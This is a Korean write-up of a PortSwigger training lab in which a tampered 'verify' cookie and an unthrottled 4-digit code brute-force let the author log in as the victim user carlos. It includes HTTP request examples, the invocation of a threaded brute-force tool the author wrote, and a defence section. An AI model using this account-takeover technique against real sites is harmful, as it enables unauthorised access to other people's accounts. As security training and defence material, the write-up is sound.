# Lab: 2FA broken logic

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — 다중 인증(MFA) / 2FA 검증 로직 결함 / `verify` 쿠키 변조 / 코드 brute-force
- **링크**: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

## 목표

2FA 검증 대상 사용자를 지정하는 `verify` 쿠키를 변조해 `carlos` 의 2FA 코드를 brute-force 로 알아내고, carlos 계정에 접근한다.

- 내 계정: `wiener:peter`
- 피해자: `carlos` (carlos 는 직접 로그인하지 않음)

## 2FA 흐름과 기초 개념

```
[정상 2FA 흐름]
  1) POST /login (username/password) 성공
     → 임시 세션 + 2FA 대기 상태
     → Set-Cookie: verify=<username>, session=<...>
  2) 사용자가 이메일로 받은 4자리 코드를 POST /login2 에 제출
  3) 코드 일치 → 302 /my-account?id=<username>
```

```
[취약 설계]
  어느 사용자의 코드를 검증/로그인할지를 "verify" 쿠키로 결정
  → 이 쿠키가 클라이언트에 의해 제어됨 (변조 가능)
```

## 취약 지점

### 1. `verify` 쿠키가 검증 대상을 결정

```
POST /login (wiener:peter)
  → Set-Cookie: verify=wiener; HttpOnly
     ↑ 서버가 "앞으로 이 세션은 wiener의 2FA를 검증" 한다고 알림

쿠키를 verify=carlos 로 바꾸면
  → 서버가 carlos 의 2FA 코드를 검증
```

### 2. 코드 brute-force 방어 부재

```
- 4자리 숫자 코드 (10,000가지)
- 시도 횟수 제한/잠금 없음
→ carlos 의 코드를 전수 대입으로 찾을 수 있음
```

### 3. 코드 생성 트리거

```
GET /login2?verify=carlos (또는 verify 쿠키=carlos 상태로 GET /login2)
  → carlos 용 임시 2FA 코드가 서버에 생성됨
  → 그 코드를 brute-force 로 맞히면 로그인
```

## 공격 단계

### 1단계 — 2FA 흐름 관찰

`wiener:peter` 로 로그인해 2FA 페이지로 이동하고 요청을 관찰한다.
`POST /login2` 에서 **`verify` 쿠키**가 검증 대상 사용자를 결정함을 확인한다.

```http
POST /login2 HTTP/1.1
Cookie: verify=wiener; session=<...>

mfa-code=1234
```

### 2단계 — verify 쿠키를 carlos 로 변경

로그아웃 후(또는 그대로), `verify` 쿠키를 `carlos` 로 바꾼다.

```
Cookie: verify=carlos; session=<...>
```

### 3단계 — carlos 용 코드 생성

`GET /login2` 를 `verify=carlos` 상태로 요청해 피해자용 임시 코드를 생성시킨다.

### 4단계 — 코드 brute-force

```
POST /login2
Cookie: verify=carlos; session=<...>

mfa-code=§0000~9999§
```

각 요청의 응답을 보면 대부분 실패(200, "Incorrect security code")이고
**하나만 302** 다. 그 302 의 `Location` 은 `/my-account?id=carlos` 이다.

### 5단계 — 계정 접근

302 응답이 발급한 세션 쿠키로 `/my-account` 에 접근하면 carlos 로 로그인됨 → 랩 해결.

## 자동화 툴

```bash
python3 tools/14-authentication-2fa-broken-logic.py \
  --target "https://LAB-ID.web-security-academy.net" --victim carlos
```

```
동작:
  1) wiener:peter 로그인 → 2FA 대기 세션 확보
  2) verify 쿠키를 carlos 로 교체 → GET /login2 로 carlos 코드 생성
  3) POST /login2 mfa-code 를 0000~9999 스레드 병렬 brute-force (302 탐지)
  4) 성공 응답의 세션 쿠키로 리다이렉트 추적 + /my-account 로그인 사용자 확인
```

주요 옵션:

```
--verify-cookie verify      검증 대상 쿠키 이름
--verify-param verify       (호환용) body/query 파라미터
--mfa-field mfa-code        코드 파라미터
--code-length / --start/--end   코드 범위
--threads 30                동시 요청 (코드 유효시간 대응)
--no-verify                 계정 페이지 검증 생략
```

### 툴 디버깅에서 배운 점

```
[증상]
  brute 로 302 를 찾았지만 Location 이 /my-account?id=wiener 였고
  그 뒤 계정 페이지 확인 실패

[원인]
  verify 를 "요청 파라미터" 로만 취급했지만 실제로는 "쿠키"
  → 쿠키는 여전히 verify=wiener 라서 wiener 로 로그인됨

[해결]
  - 로그인 응답의 Set-Cookie: verify=wiener 를 관찰
  - 동명 쿠키를 값 교체 방식으로 verify=carlos 로 변경(중복 쿠키 방지)
  - 성공 응답이 발급한 세션 쿠키를 별도 세션에 보존해 검증
    (동시 요청이 공유 쿠키를 덮는 문제 방지)
```

서버가 어떤 값을 근거로 판단하는지(파라미터/쿠키/헤더)를 정확히 식별하는 것이 핵심이었다.

## 방어

```
[근본 원인 1]
  2FA 검증 대상 사용자를 클라이언트 제어 값(verify 쿠키)으로 결정

[근본 원인 2]
  4자리 코드에 대한 시도 제한/잠금 부재

[올바른 방어]
  1. 검증 대상 사용자를 서버 측 세션 상태에서만 결정
     - "이 세션은 로그인 1단계에서 인증된 사용자 X 의 2FA 대기 중" 을 서버가 보관
     - 클라이언트가 대상 사용자를 지정하지 못하게 함
     - verify 등 임시 상태를 쿠키로 둘 경우 서명(무결성 보호) 또는 서버 저장
  2. 2FA 코드 brute-force 방어
     - 시도 횟수 제한(예: 3회) 및 코드 즉시 무효화
     - 지수 백오프, 계정 잠금, IP rate limiting
     - 코드 유효시간 짧게, 재전송 시 이전 코드 무효화
     - 코드 길이/엔트로피 상향, MFA 피로 공격 방지
  3. 2FA 완료 후에만 완전 인증 세션 발급
  4. 로그인/2FA 실패 모니터링

[주의]
  내부 상태(누구의 2FA인지)를 쿠키로 내려보내면 변조될 수 있다.
```

## 핵심 정리

- `verify` 쿠키가 2FA 검증 대상 사용자를 결정했고, 이를 `carlos` 로 바꿔 carlos 의 코드를 검증하도록 만들었다.
- 4자리 코드에 시도 제한이 없어 0000~9999 brute-force 로 코드(`0425`)를 찾았다.
- 성공 302 는 `/my-account?id=carlos` 로, 이 세션 쿠키로 carlos 계정에 접근했다.
- 방어는 검증 대상을 서버 세션에서만 결정하고, 2FA 코드에 시도 제한/무효화를 적용하는 것이다.

## 배운 점

- "서버가 무엇을 근거로 판단하는가" 를 식별하는 것이 취약점 분석의 출발점이다 (쿠키 vs 파라미터).
- 002(2FA 단순 우회)는 검증 자체를 건너뛴 경우, 008 은 검증 대상 사용자를 바꾼 경우다.
- 작은 상태값(verify)이 인증 경계를 무너뜨릴 수 있으므로 서버 측 무결성 보호가 필요하다.
- 이 랩을 위해 `tools/14-authentication-2fa-broken-logic.py` 를 작성하고, 쿠키/세션 처리의 실수를 디버깅하며 서버 판단 근거를 정확히 모델링하는 법을 익혔다.
